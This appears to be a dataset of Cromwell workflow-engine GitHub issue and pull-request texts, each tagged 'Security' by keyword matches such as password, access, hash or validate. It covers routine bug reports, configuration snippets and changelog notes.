Security,", ""command_mem"": small_task_mem * 1000 - 500,; ""disk"": small_task_disk, ""boot_disk_size"": boot_disk_size}. scatter (normal_bam in zip(normal_bams, normal_bais)) {; call m2.Mutect2 {; input:; intervals = intervals,; ref_fasta = ref_fasta,; ref_fai = ref_fai,; ref_dict = ref_dict,; tumor_reads = normal_bam.left,; tumor_reads_index = normal_bam.right,; scatter_count = scatter_count,; m2_extra_args = select_first([m2_extra_args, """"]) + "" --max-mnp-distance 0"",; gatk_override = gatk_override,; gatk_docker = gatk_docker,; preemptible = preemptible,; max_retries = max_retries,; pon = pon,; pon_idx = pon_idx,; gnomad = gnomad,; gnomad_idx = gnomad_idx; }; }. output {; Array[File] normal_calls = Mutect2.filtered_vcf; Array[File] normal_calls_idx = Mutect2.filtered_vcf_idx. }; }. ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }; backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5352:4925,PASSWORD,PASSWORDS,4925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5352,1,['PASSWORD'],['PASSWORDS']
Security,"- 0.24; - SGE backend. I accidentally gave an Int parameter a String value in the json. I would prefer an error specific to parameter type, rather than a generic invalid runtime attribute error message (below). Proposed solution: ; ``Task m1_task was given an invalid type for cpu = ""${cpu}"". A String was given, though parameter is an Int``. Current error message:; ```; [ERROR] [02/08/2017 10:38:57.225] [cromwell-system-akka.dispatchers.engine-dispatcher-8] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor Workflow 07a3f007-8c62-4cd4-8668-6ac034ff42f1 failed (during InitializingWorkflowState): Task m1_task has an invalid runtime attribute cpu = ""${cpu}""; java.lang.IllegalArgumentException: Task m1_task has an invalid runtime attribute cpu = ""${cpu}""; at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:156); at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1963:869,validat,validateRuntimeAttributes,869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1963,1,['validat'],['validateRuntimeAttributes']
Security,"- 0.24; - single workflow mode; - JES backend. When I run the workflow, I get a localization permission error, but when I try again from the command line, there is no issue.; From cromwell:; ```; ....snip....; java.lang.RuntimeException: Task 773d051e-2e93-4248-bca4-e40292e0e59d:generate_true_positives failed: error code 5. Message: 9: Failed to localize files: failed to copy the following files: ""gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list -> /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list (cp failed: gsutil -q -m cp gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list, command failed: AccessDeniedException: 403 Caller does not have storage.objects.list access to bucket firecloud-tcga-open-access.\nCommandException: 1 file/object could not be transferred.\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:489); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:61); ....snip....; ```; ; BUT I would think this next operation would fail and it does not:; ```; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ gsutil ls gs://firecloud-tcga-open-access/tutorial/reference/; gs://firecloud-tcga-open-access/tutorial/reference/CNV.hg19.bypos.111213.txt; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.dict; gs://firecloud-tcga-open-access/tutori",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1960:426,access,access,426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1960,4,['access'],['access']
Security,- Added `monitoring_image_script` localization after ssh access startup and before starting the `monitoring_image`; - Added test to make sure ssh access wasn't broken by change; - Ensure Genomics & CLS use the exact same order for actions; - Other de-dupes related to updating Genomics/CLS actions; - Entrypoint workarounds for BA-6406 / https://partnerissuetracker.corp.google.com/issues/155231711 in images other than the user's `runtime { docker: … }` such as `monitoring_image`; - More actions-logging-other-actions such as the `monitoring_image` and ssh access starting,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5766:57,access,access,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5766,3,['access'],['access']
Security,"- Adds a way to lookup docker hashes from local machine, thanks @kshakir !; - ~~Adds a config option to disable docker lookup entirely.~~; - Disable docker lookup if the backend does not support docker. ~~@LeeTL1220 this is slightly different from what we talked this morning but I think it should still enable your use case.; If you disable docker hash lookup on the SGE cromwell server, you'll still have call caching and there will be no lookup (so it won't fail..).~~",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139:30,hash,hashes,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139,2,['hash'],"['hash', 'hashes']"
Security,"- Better localization and delocalization of directories in PAPI2 using hidden files to cover for empty directories; - IWDR localization is not baked in the CWL code anymore but left to the backend. This allows for the PAPI backend to opt out of it since localization is done directly on the VM.; - ~~Use configurable `job-shell` instead of hardcoded `/bin/bash`~~ It fixes 117 but also makes a bunch of centaur tests fail, so leaving as is for now.; - Refactors Pipelines conversions in v2 (w/ typeclasses !); - Allow for lazy evaluation of file and directory literals so that they can be written when the backend and the appropriate IoFunctions are known. This only partially covers the possible cases. It needs a deeper tech talk discussion. This is orthogonal to the above and only here to avoid a later rebase (the files changed overlap with the refactoring mentioned).; - Partially replaces the custom `MemorySize` with [squants](https://github.com/typelevel/squants); - Turns the CPU runtime validation from an `Int` to a `Int Refined Positive`; - Automatically fits the resources requirements in the task to the [GCE constraints](https://cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type#specifications)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3697:998,validat,validation,998,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3697,1,['validat'],['validation']
Security,"- Commit 1: Creates 2 subdirectories in the call directory. ```; cromwell-executions/globbinginput/; └── 970c776f-3b9d-4c0e-a2ff-dbd76395b4ba; ├── call-globtask; │   ├── execution; │   │   ├── outputfile1.txt; │   │   ├── outputfile2.txt; │   │   ├── rc; │   │   ├── script; │   │   ├── script.background; │   │   ├── script.submit; │   │   ├── stderr; │   │   ├── stderr.background; │   │   ├── stdout; │   │   └── stdout.background; │   └── inputs; │   └── 90e8d77e2a99e99efa82c33e27365d71; │   └── somefile.txt; ```. This prevents globbing from matching input files as they're not in the same branch.; - Commit 2: Instead of recreating the whole directory structure underneath the call directory, hash the path and create a single directory named with this hash. ; - This reduces the depth of the call directory, and is hopefully a bit less confusing (people tend to be confused when they see the full path of their input file appended to the call directory); - The hash is only computed from the fullpath of the input's parent directory (not including the filename). This ensures that multiple files from the same directory will still end up in the same directory once localized). The hashing part is not necessary to fix this bug at all, and I remember the choice was made not to use hashes because it's unreadable and makes it hard to know where the inputs came from but I feel like recreating the full path underneath the call directory is even worse...; - Commit 3: Change the globbing pattern so it does NOT traverse recursively the hierarchy looking for matches by default. If that's the desired behaviour it should be reflected in the glob pattern in the wdl (with `**`). This is necessary to allow for this kind of usage https://github.com/broadinstitute/cromwell/issues/1245",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1415:700,hash,hash,700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1415,5,['hash'],"['hash', 'hashes', 'hashing']"
Security,"- Cromwell does not support soft links for dockerized jobs by [design](https://github.com/broadinstitute/cromwell/blob/29_hotfix/supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystem.scala#L112); - I guess that's because symlinks are a big challenge with Docker. They do not work inside Docker container unless both the directories are mounted (dir with symlink - Cromwell's tmp execution dir and original dir where input files are present), plus, mounts inside the container should have the same name/path as that of the host file system. Since Cromwell has information about original input files, they can be mounted along with the tmp execution dir (where symlinks will be created), to the Docker container; - This possesses a threat (of being modified inside a Docker container), to input files, which can be circumvented by using read only access to the input files (similar threat is also applicable to hard linked input files, in case of current behavior); - Also given the nature of hard-links, they can be completely eliminated . Benefits of using symlinks over hard-links:; - Hard links can't cross file systems; soft links can; - OS user which runs Cromwell requires to have a write access to input files in order for hard-links to work, this is not a requirement for soft links; - When hard-links do not work in case of Docker jobs (when necessary conditions - write access, same device requirement, aren't satisfied), Cromwell falls back to copy option, which takes a significant performance hit as the input files could be huge",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620:751,threat,threat,751,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620,5,"['access', 'threat']","['access', 'threat']"
Security,- Enables 121 on PAPIv2; - Refactors Pipelines conversions in v2 (w/ typeclasses !); - Partially replaces the custom `MemorySize` with [squants](https://github.com/typelevel/squants); - Turns the CPU runtime validation from an `Int` to a `Int Refined Positive`; - Automatically fits the resources requirements in the task to the [GCE constraints](https://cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type#specifications); - Allow for lazy evaluation of file and directory literals so that they can be written when the backend and the appropriate IoFunctions are known,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3694:208,validat,validation,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3694,1,['validat'],['validation']
Security,- I don't think Cromwell had any opinions on where it gets called from (it's all stateless REST queries over HTTP) - could you give an example of what you're trying to do? ; - I've only ever seen `Access-Control-Allow-Origin` in reference to web browser behavior ; - Maybe you have something in front of Cromwell that's blocking you?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342845454:197,Access,Access-Control-Allow-Origin,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342845454,1,['Access'],['Access-Control-Allow-Origin']
Security,"- I have a failing test case, so that's a pretty good place to start looking!; - One assumption I need to validate is that every CWL file has exactly one `Callable`:; ```; WomBundle(primaryCallable = Option(value), allCallables = Map.empty, typeAliases = Map.empty); ```; This is based on reading the CWL spec and the declaration; ```; type Cwl = Workflow :+: CommandLineTool :+: ExpressionTool :+: CNil; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431882059:106,validat,validate,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431882059,1,['validat'],['validate']
Security,"- JES backend; - 0.24; - single workflow mode. When JES returns a 403 AccessDeniedException, should cromwell keep retrying? It delays the result getting back to the user and should have no way of recovering with retries. Proposed solution: When AccessDeniedException is seen from JES, simply end there, instead of initiating any retries...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961:70,Access,AccessDeniedException,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961,2,['Access'],['AccessDeniedException']
Security,- Moved memory validation from WDL4s to Backend validation.; - Removed unused validation functions from CromwellRuntimeAttributes.; - Added validation for negative values in memory and cpu.; - Moved CPU validation from JES backend to generic backend validation functions object.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/741:15,validat,validation,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/741,6,['validat'],['validation']
Security,"- Refactor things slightly to give the `typeEvaluators` access to the `typeAliases` map, which contains all the struct definitions ; - Make a `typeEvaluator` for StructLiterals",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7402:56,access,access,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7402,1,['access'],['access']
Security,- Remove the bit where supplied labels are injected into Google. ; - Remove the Google-related restrictions on label structure. These should just be allowed to be anything*; - Provide a new workflow option `google-labels` which **do** get injected into Google and enforces Google's restrictions; - Communicate that this changed to FC,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3233:43,inject,injected,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3233,2,['inject'],['injected']
Security,"- Removed `martha_v2` response parsing; - When traversing files using a mapper function then mapper does the exclusion; - Use serialized class instead of config string replace for Martha request generation; - Request partial responses from Martha; - Use JDK standard responses for missing file attributes (size=0, time=epoch, hash=None); - Copy `timeCreated` from DOS/DRS to file attributes; - Martha `read_string()` uses `gsUri` (gs://bucket/name) instead of `bucket` and `name`; - Martha localization uses safer file paths still based on the DOS/DRS URI; - Reading DOS/DRS content uses the config google auth type, not always Bond-or-USA; - Google config auth types support ADC=SA, passing in scopes to ADC; - Google auth type `UserMode` no longer requires config values that it was ignoring; - Allow skipping docker build-and-push by specifying the `CROMWELL_BUILD_PAPI_DOCKER_IMAGE_DRS`; - `papi-v2-usa` backend now ALWAYS uses the USA just like Terra/FC does",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5912:326,hash,hash,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5912,1,['hash'],['hash']
Security,"- SGE backend (though I bet backend does not matter); - server mode; - cromwell 29. WDL takes in a list of filenames and scatters over a read_lines call. Each line is a file.; If the list file has DOS line endings, read_lines preserves the `\r` character in the file name. After running dos2unix, the issue disappeared. Here is the error message and you can even see the appended `\r`... ```; Could not localize /seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r -> /dsde/working/lichtens/sge_cromwell/cromwell-executions/m2_validation/3055776a-c32a-4309-a426-87f5730454b4/call-m1_basic_validator/shard-1/inputs/seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r:\n\t/seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r doesn't exists\n\tFile not found /seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r\n\tFile not found /dsde/working/lichtens/sge_cromwell/cromwell-executions/m2_validation/3055776a-c32a-4309-a426-87f5730454b4/call-m1_basic_validator/shard-1/inputs/seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r -> /seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r\n\tFile not found /seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r""; ```. Hash error:; ```; ""Cannot hash file /seq/picard_aggregation/G20440/HSCX1989N/v2/HSCX1989N.bai\r because it can't be found"". ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2632:1208,Hash,Hash,1208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2632,2,"['Hash', 'hash']","['Hash', 'hash']"
Security,"- There are *five* different authentication schemes (It looks like ""four"" is a typo); - Made each of the five options subheaders under ""Configuring Authentication"" for clarity",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5529:29,authenticat,authentication,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5529,2,"['Authenticat', 'authenticat']","['Authentication', 'authentication']"
Security,"- There's no migration to move hashes from previous workflows to metadata. Which means the Call Caching Diff endpoint won't work for those. Instead of returning an empty diff which could be mistaken for ""those calls are identical"", return 404.; @katevoss @bradtaylor If that's a behavior we want to change please say so (cf email sent earlier this week). - Reverts the code that was persisting failed jobs hashes to the hash table. We don't need it anymore because it's in the metadata and that's what the Call Caching endpoint is using. - Update changelog / README",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2372:31,hash,hashes,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2372,3,['hash'],"['hash', 'hashes']"
Security,- To the changelog:; - Added entry for already released 62; - Added placeholder for next release 63; - For homebrew:; - Remove extra slash added to generated URLs; - Changed default publishing instructions to include homebrew; - Added validation of brew style according to guidelines; - Fixed casing of 'cromwell' in PR name; - For the publishing GitHub token scopes:; - updated instructions; - updated validation; - gracefully error with helpful messages; - added an example image; - Removed attempt to publish from dbms tests,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6338:235,validat,validation,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6338,2,['validat'],['validation']
Security,"- Update to WDL 1.0 syntax; - Automate PR to homebrew; - Can be used to release minor versions. The brew task supposes `brew` is installed on the machine where Cromwell runs. There is a [Brew Linux docker image](https://hub.docker.com/r/linuxbrew/linuxbrew/) that maybe could be used but the `git` commands don't seem to be authenticated properly in the container (probably because the ssh keys aren't there). I'm sure this can be worked around, maybe in the next iteration.. This can be fully tested with a different `organization` as long as it has a fork of Cromwell and homebrew-core.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3810:324,authenticat,authenticated,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3810,1,['authenticat'],['authenticated']
Security,- WA will receive a WdlSource in preStart will try to validate it.; - BA will receive a list of jobDescriptors and will try to validate runtime requirements.; - Needs to defined if the will be a MIM in validation state in WA.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-205881870:54,validat,validate,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-205881870,3,['validat'],"['validate', 'validation']"
Security,"- Yes, does use private docker hub credentials.; - I took defaults otherwise. This was working fine yesterday. Did I need to re-authenticate?. On Wed, Nov 2, 2016 at 9:55 AM, kcibul notifications@github.com wrote:. > What authentication mode are you running in (default credentials, service; > account or refresh token)? Does your config make use of private dockerhub; > credentials; > ; > I'm wondering why it's writing an authorization at all.; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXk2yTbJKsspghDzPz2y5Tp7jKKmnNks5q6JY_gaJpZM4KnP3t; > . ## . Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257987410:128,authenticat,authenticate,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257987410,3,"['authenticat', 'authoriz']","['authenticate', 'authentication', 'authorization']"
Security,"- [x] Implement https://github.com/openwdl/wdl/pull/219 in the WDL Biscayne classes; - Implement all of the changes in the SPEC text, not just the issue description!; - [x] Add `womtool validate` tests to ensure they are still not allowed in `version 1.0`; - [x] Cycle back to the openWDL issue so that it can be *merged* once an implementation exists",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3871:186,validat,validate,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3871,1,['validat'],['validate']
Security,"- [x] Needs a rebase on `develop` after #3505 . Wires in and checks imported tasks, workflows, namespaces and aliases; NB: the test WDL appears twice - once in a `womtool validate` test and once as a centaur test",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3530:171,validat,validate,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3530,1,['validat'],['validate']
Security,"- [x] Needs https://github.com/broadinstitute/wdl4s/pull/47; - [x] Needs https://github.com/broadinstitute/centaur/pull/114; - [x] Needs WDL doc; - [x] Needs Cromwell doc. What it does in a nutshell:. - Enables sub workflows execution; - Sub workflow metadata can be queried separately or injected in the main workflow metadata; - Restarts work; - Aborts should work (work meaning what abort is doing in develop now). To be addressed:; - ~~Sub Workflow Store cleanup~~; - ~~Workflow outputs copying~~ -> https://github.com/broadinstitute/cromwell/issues/1684; - ~~Call logs copying~~; - ~~Provenance: More related to imports, but right now the actual WDL content of a sub workflow is unknown to cromwell (it's in the `WdlNamespace` as a scala object but the actual text is not available).~~; - ~~Stats Endpoint~~",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1682:289,inject,injected,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1682,1,['inject'],['injected']
Security,"- [x] Perform OAuth authentication (via clicky buttons in swagger, gcloud on CLI); - [x] Register user in Sam; - [x] Submit workflow to Cromwell; - [x] Get final results from Cromwell for that workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701:20,authenticat,authentication,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701,1,['authenticat'],['authentication']
Security,- [x] README update; - [x] Changelog update; - [x] What should happen to `call-caching.lookup-docker-hash` conf entry ?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1969:101,hash,hash,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1969,1,['hash'],['hash']
Security,"- dev snapshot of cromwell pre-0.21; - local backend; - Specifying docker from options file; - Fails when running with sudo or without (same error); - `wdltool` validates successfully; - Being run on google cloud VM ; - And after error occurs, cromwell stays running. . I believe that this was working, as is, in cromwell 0.19. I believe that it is having trouble parsing the option file. Command:. ``` bash; java -Xmx4g -Dconfig.file=local_application.conf -jar \; /home/lichtens/test_eval/cromwell-0.20-028b74a-SNAPSHOT.jar run case_gatk_acnv_workflow.final.wdl \ ; /home/lichtens/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.final.json \; default_runtimes \; /home/lichtens/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.metadata.json; ```. Error message:. ```; [2016-09-21 17:51:25,15] [error] Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); java.lang.RuntimeException: Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); at cromwell.backend.validation.RuntimeAttributesValidation$class.validateOptionalExpression(RuntimeAttributesValidation.scala:319); at cromwell.backend.validation.RuntimeAttributesValidation$$anon$1.validateOptionalExpression(RuntimeAttributesValidation.scala:90); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.sfs.Shar",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1465:161,validat,validates,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1465,1,['validat'],['validates']
Security,"- local backend with 16 cores and 104GB RAM; - cromwell-0.21-6da2d10-SNAPSHOT.jar (incl. file path hashing and local backend throttling). Whether the job is a cache hit or not, it seems that the cromwell final overhead takes 3-8 minutes, which is a long time. This happens even for jobs where the files generated (and input) are very small (and there are few files). We do not use `read_string` in the wdl. http://104.198.41.229:8080/api/workflows/v2/70a6e380-1dd7-473b-a852-4bd54b22ecdf/timing",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488:99,hash,hashing,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488,1,['hash'],['hashing']
Security,"- local backend. The slowness is probably driven by calculating a md5 hash on the bam input files. For jobs that do not have bam files as inputs, the cache determination is fast. Calculating a md5 on a bam file is too slow for use in call caching on a local backend. I can provide a time estimate, if necessary. Does SGE backend has the same issue?. Proposed solution:; - If md5 file is next to input file (e.g. sample1.bam is next to sample1.bam.md5) then read the md5 hash from the *.md5 file. Otherwise, use the file path. For bams, the file paths will tend to be static for most local backend environments anyway. ; - Make sure this convention is documented.; - Perhaps have a flag in the conf file so that users can choose which convention they prefer? IMHO, have the fast method (above) as the default.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1483:70,hash,hash,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1483,2,['hash'],['hash']
Security,"- single workflow; - JES. Been at this point for ~15 minutes. Please note that the workflow directory in the bucket does not exist. ```; ...snip....; [2016-11-02 13:27:06,88] [info] WorkflowManagerActor Successfully started WorkflowActor-35b2e3c9-0aba-4f96-a7cf-9f1fbf3ced16; [2016-11-02 13:27:06,88] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2016-11-02 13:27:07,21] [info] MaterializeWorkflowDescriptorActor [35b2e3c9]: Call-to-Backend assignments: case_gatk_acnv_workflow.PlotACNVResults -> JES, case_gatk_acnv_workflow.NormalNormalizeSomaticReadCounts -> JES, case_gatk_acnv_workflow.NormalWholeGenomeCoverage -> JES, case_gatk_acnv_workflow.TumorCaller -> JES, case_gatk_acnv_workflow.TumorCorrectGCBias -> JES, case_gatk_acnv_workflow.NormalPerformSeg -> JES, case_gatk_acnv_workflow.TumorWholeGenomeCoverage -> JES, case_gatk_acnv_workflow.CNLoHAndSplitsCaller -> JES, case_gatk_acnv_workflow.TumorCalculateTargetCoverage -> JES, case_gatk_acnv_workflow.NormalCaller -> JES, case_gatk_acnv_workflow.TumorNormalizeSomaticReadCounts -> JES, case_gatk_acnv_workflow.HetPulldown -> JES, case_gatk_acnv_workflow.PlotSegmentedCopyRatio -> JES, case_gatk_acnv_workflow.TumorAnnotateTargets -> JES, case_gatk_acnv_workflow.NormalCorrectGCBias -> JES, case_gatk_acnv_workflow.TumorPerformSeg -> JES, case_gatk_acnv_workflow.NormalCalculateTargetCoverage -> JES, case_gatk_acnv_workflow.PadTargets -> JES, case_gatk_acnv_workflow.NormalAnnotateTargets -> JES, case_gatk_acnv_workflow.AllelicCNV -> JES; [2016-11-02 13:27:07,49] [info] JES [35b2e3c9]: Creating authentication file for workflow 35b2e3c9-0aba-4f96-a7cf-9f1fbf3ced16 at; gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/case_gatk_acnv_workflow/35b2e3c9-0aba-4f96-a7cf-9f1fbf3ced16/35b2e3c9-0aba-4f96-a7cf-9f1fbf3ced16_auth.json; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644:1573,authenticat,authentication,1573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644,1,['authenticat'],['authentication']
Security,- throttling was on; - call cache hashing was done with file paths,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978:34,hash,hashing,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978,1,['hash'],['hashing']
